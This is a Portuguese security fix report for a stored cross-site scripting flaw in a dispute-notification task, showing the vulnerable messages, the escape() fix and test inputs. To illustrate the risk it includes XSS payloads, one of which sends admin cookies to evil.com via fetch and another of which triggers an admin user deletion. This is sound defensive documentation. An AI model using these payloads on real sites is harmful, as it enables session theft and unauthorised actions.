# Correção CWE-20,79,80: Cross-Site Scripting (XSS) em notificacoes_disputas.py

## Vulnerabilidade Identificada
**Ficheiro:** `app/tasks/notificacoes_disputas.py`  
**Linhas:** 36, 42, 48, 58, 64, 95  
**Severidade:** ALTA  
**CWE:** CWE-20 (Improper Input Validation), CWE-79 (XSS), CWE-80 (XSS)

## Descrição da Vulnerabilidade

### Dados Não Sanitizados em Notificações
- **Problema:** Mensagens de notificação usam dados não sanitizados de DB
- **Risco:** XSS armazenado (Stored XSS) quando notificações são exibidas
- **Impacto:** Execução de JavaScript malicioso no browser dos utilizadores

### Dados Vulneráveis

#### 1. `disputa.transacao.fatura_ref`
```python
mensagem=f"🚨 Nova disputa aberta: {disputa.transacao.fatura_ref}. Análise necessária."  # ❌ XSS
```

#### 2. `disputa.id`
```python
mensagem=f"✅ Disputa #{disputa.id} registrada. Admin irá analisar seu caso."  # ❌ XSS
```

#### 3. `admin_nome` (parâmetro)
```python
mensagem=f"📋 Disputa {disputa.id} resolvida por {admin_nome}. Decisão: {decisao}."  # ❌ XSS
```

#### 4. `decisao` (parâmetro)
```python
mensagem=f"📋 Disputa {disputa.id} resolvida por {admin_nome}. Decisão: {decisao}."  # ❌ XSS
```

#### 5. `disputa.taxa_administrativa`
```python
mensagem=f"⚠️ Disputa resolvida contra você. Taxa admin: {disputa.taxa_administrativa} Kz."  # ❌ XSS
```

### Cenário de Exploração (Stored XSS)

#### Ataque via fatura_ref
1. Atacante cria transação com `fatura_ref = "AK-<script>alert('XSS')</script>"`
2. Comprador abre disputa
3. Task cria notificação: `"🚨 Nova disputa aberta: AK-<script>alert('XSS')</script>"`
4. Notificação é armazenada no DB
5. Admin visualiza notificações no painel
6. JavaScript é executado no browser do admin
7. Possível roubo de sessão, CSRF, ou outras ações maliciosas

#### Ataque via admin_nome
1. Atacante compromete conta admin com nome `"Admin<img src=x onerror=alert(1)>"`
2. Admin resolve disputa
3. Notificação criada com payload XSS
4. Outros admins visualizam notificação
5. JavaScript executado

## Correção Implementada

### Sanitização com escape() em Todas as Mensagens

#### 1. Import do escape
```python
from markupsafe import escape
```

#### 2. Notificações de Abertura
**Antes:**
```python
mensagem=f"🚨 Nova disputa aberta: {disputa.transacao.fatura_ref}. Análise necessária."
mensagem=f"⚠️ Disputa aberta para {disputa.transacao.fatura_ref}. Aguardando análise."
mensagem=f"✅ Disputa #{disputa.id} registrada. Admin irá analisar seu caso."
```

**Depois:**
```python
mensagem=f"🚨 Nova disputa aberta: {escape(disputa.transacao.fatura_ref)}. Análise necessária."
mensagem=f"⚠️ Disputa aberta para {escape(disputa.transacao.fatura_ref)}. Aguardando análise."
mensagem=f"✅ Disputa #{escape(str(disputa.id))} registrada. Admin irá analisar seu caso."
```

#### 3. Notificações de Resolução
**Antes:**
```python
mensagem=f"✅ Disputa resolvida! Reembolso processado para {disputa.transacao.fatura_ref}."
mensagem=f"⚠️ Disputa resolvida contra você. Taxa admin: {disputa.taxa_administrativa} Kz."
mensagem=f"📋 Disputa {disputa.id} resolvida por {admin_nome}. Decisão: {decisao}."
```

**Depois:**
```python
mensagem=f"✅ Disputa resolvida! Reembolso processado para {escape(disputa.transacao.fatura_ref)}."
mensagem=f"⚠️ Disputa resolvida contra você. Taxa admin: {escape(str(disputa.taxa_administrativa))} Kz."
mensagem=f"📋 Disputa {escape(str(disputa.id))} resolvida por {escape(admin_nome)}. Decisão: {escape(decisao)}."
```

## Camadas de Proteção

1. ✅ **escape(fatura_ref)**: Sanitiza referência da fatura (3 ocorrências)
2. ✅ **escape(str(disputa.id))**: Sanitiza ID da disputa (2 ocorrências)
3. ✅ **escape(admin_nome)**: Sanitiza nome do admin (1 ocorrência)
4. ✅ **escape(decisao)**: Sanitiza decisão (1 ocorrência)
5. ✅ **escape(str(taxa_administrativa))**: Sanitiza valor da taxa (1 ocorrência)

## Tipo de XSS

### Stored XSS (Mais Perigoso)
- **Armazenado**: Payload salvo no DB (tabela Notificacao)
- **Persistente**: Afeta todos que visualizam a notificação
- **Alcance**: Múltiplos utilizadores (admins, produtores, compradores)
- **Duração**: Permanece até notificação ser apagada

### Diferença de Reflected XSS
- **Reflected**: Payload na URL, executa uma vez
- **Stored**: Payload no DB, executa sempre que visualizado
- **Impacto**: Stored XSS é mais grave (CVSS score mais alto)

## Impacto da Correção

### Segurança
- ✅ Previne Stored XSS em notificações
- ✅ Protege admins, produtores e compradores
- ✅ Sanitização de dados de DB e parâmetros
- ✅ Defense in depth (múltiplas camadas)

### Integridade de Notificações
- ✅ Notificações seguras para exibição em HTML
- ✅ Dados preservados mas escapados
- ✅ Emojis mantidos (não afetados por escape)

### Compliance
- ✅ OWASP Top 10 - A03:2021 (Injection)
- ✅ CWE-79 (Stored Cross-site Scripting)
- ✅ GDPR/LGPD (proteção de dados pessoais)

## Contexto de Risco

### Por que Notificações São Alvo?
1. **Visualização Frequente**: Utilizadores verificam notificações regularmente
2. **Confiança**: Utilizadores confiam em notificações do sistema
3. **Privilégios**: Admins têm acesso elevado (alvo prioritário)
4. **Persistência**: Stored XSS permanece até ser apagado

### Exemplo Real de Ataque

#### Cenário 1: Roubo de Sessão Admin
```python
# Atacante cria fatura_ref maliciosa:
fatura_ref = "AK-<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"

# Notificação criada:
"🚨 Nova disputa aberta: AK-<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>. Análise necessária."

# Admin visualiza → Cookie roubado → Sessão comprometida ❌
```

#### Cenário 2: CSRF via XSS
```python
# Atacante injeta payload que faz ações:
admin_nome = "Admin<script>fetch('/admin/delete-user/123', {method:'POST'})</script>"

# Outros admins visualizam → Utilizador apagado sem autorização ❌
```

## Testes Recomendados

1. **XSS em fatura_ref:** `AK-<script>alert(1)</script>` → Escapado ✅
2. **XSS em admin_nome:** `Admin<img src=x onerror=alert(1)>` → Escapado ✅
3. **XSS em decisao:** `<svg/onload=alert(1)>` → Escapado ✅
4. **Visualização:** Verificar que notificações não executam JavaScript ✅
5. **Emojis:** Verificar que emojis são exibidos corretamente ✅

## Dados Sanitizados (Total: 8 ocorrências)

1. ✅ `escape(disputa.transacao.fatura_ref)` - Linha 36 (admin)
2. ✅ `escape(disputa.transacao.fatura_ref)` - Linha 42 (produtor)
3. ✅ `escape(str(disputa.id))` - Linha 48 (comprador)
4. ✅ `escape(disputa.transacao.fatura_ref)` - Linha 58 (reembolso)
5. ✅ `escape(str(disputa.taxa_administrativa))` - Linha 64 (penalização)
6. ✅ `escape(str(disputa.id))` - Linha 95 (outros admins)
7. ✅ `escape(admin_nome)` - Linha 95 (outros admins)
8. ✅ `escape(decisao)` - Linha 95 (outros admins)

## Status
✅ **CORRIGIDO** - Todas as mensagens de notificação sanitizadas com escape() para prevenir Stored XSS
